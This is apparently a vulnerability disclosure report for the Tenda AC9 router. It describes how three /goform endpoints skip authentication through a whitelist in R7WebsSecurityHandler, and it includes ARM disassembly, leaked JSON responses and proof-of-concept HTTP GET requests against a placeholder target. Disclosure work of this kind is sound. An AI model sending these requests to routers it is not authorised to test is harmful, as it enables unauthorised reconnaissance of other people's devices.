# Tenda AC9 /goform/getProduct, /goform/getWanConnectStatus, /goform/getRebootStatus Unauthenticated Information Disclosure

## 1. Vulnerability Name

**Tenda AC9 /goform/getProduct, /goform/getWanConnectStatus, /goform/getRebootStatus Unauthenticated Information Disclosure**

## 2. Basic Information

| Field | Content |
| --- | --- |
| **Vendor** | Tenda |
| **Product** | AC9 Dual-Band Wi-Fi Router |
| **Firmware Version** | V1.0 V15.03.05.14_multi / V15.03.05.16 |
| **Firmware File** | 49049A094561CA9365CF129DA98622171BAB8BB8EB5DA83EE8730561DA16F3F1 (SHA256) |

## 3. Vulnerability Principle & Data Flow

All three endpoints match entries in the auth-exempt whitelist of `R7WebsSecurityHandler`. When a request URL matches, the function returns `0` immediately, skipping authentication before the request reaches its handler. Each handler then directly returns JSON containing sensitive device-state information without any session verification.

```
HTTP GET /goform/getProduct  (no auth)
        │
        ▼
R7WebsSecurityHandler @ 0x2f0d4
        │  URL matches auth-exempt whitelist → return 0 (skip auth)
        ▼
Handler → return JSON: {"product":"f1203","accessType":"1"}
        │
        ▼
Attacker obtains product code / connection status / reboot status

(same data flow applies to /goform/getWanConnectStatus and /goform/getRebootStatus)
```

Leaked content per endpoint:

| Endpoint | Response Example | Leaked Info |
| --- | --- | --- |
| `/goform/getProduct` | `{"product":"f1203","accessType":"1"}` | Internal product code F1203 (AC9), access type (1=wired / 2=wireless) |
| `/goform/getWanConnectStatus` | `{"connectStatus":7}` | WAN connection status (7=connected) |
| `/goform/getRebootStatus` | `{"status":"success"}` | Reboot status |

## 4. Key Functions

| Function | Address | Role |
| --- | --- | --- |
| `R7WebsSecurityHandler` | `0x2f0d4` | Auth-exempt whitelist; `strcmp` match for the three endpoints → bypass |
| `GetProduct` | `0x676f8` | Handler that returns `{"product":"f1203","accessType":"1"}` with no auth check |

### R7WebsSecurityHandler @ 0x2f0d4 — auth-exempt bypass (confirmed by disassembly)

```asm
; R7WebsSecurityHandler @ 0x2f0d4 (excerpt, ARM)
0x0002f0d4:  push     {r4, r5, r6, r7, fp, lr}
0x0002f0dc:  sub      sp, sp, #0x480
...
0x0002fea0:  ldr      r3, [pc, #0x2a0]      ; GOT -> "/goform/getProduct"
0x0002fea4:  ldr      r3, [r4, r3]
0x0002fea8:  bl       #0xf68c               ; strcmp(url, "/goform/getProduct")
0x0002feac:  mov      r3, r0
0x0002feb0:  cmp      r3, #0
0x0002feb4:  beq      #0x2fef8              ; matched -> passthrough
...
0x0002ff14:  mov      r3, #0                ; set passthrough flag = 0
0x0002ff18:  str      r3, [fp, #-0x18]      ; AUTH BYPASS
```

### GetProduct handler @ 0x676f8 — returns device info with no auth

```c
// GetProduct @ 0x676f8 (confirmed present in httpd, size 0x2bc)
// Reads product code (F1203) and access type from config, builds JSON,
// and writes it directly to the HTTP response without any session check.
// → {"product":"f1203","accessType":"1"}
```

The whitelist entries `/goform/getProduct` (va `0xdaf44`), `/goform/getWanConnectStatus` (`0xdaf28`), and `/goform/getRebootStatus` (`0xdaf58`) are all present as adjacent strings in the `.rodata` section and referenced by the `strcmp` chain inside `R7WebsSecurityHandler`.

## 5. Test PoC

```http
GET /goform/getProduct HTTP/1.1
Host: <TARGET>:8080
```

```http
GET /goform/getWanConnectStatus HTTP/1.1
Host: <TARGET>:8080
```

```http
GET /goform/getRebootStatus HTTP/1.1
Host: <TARGET>:8080
```
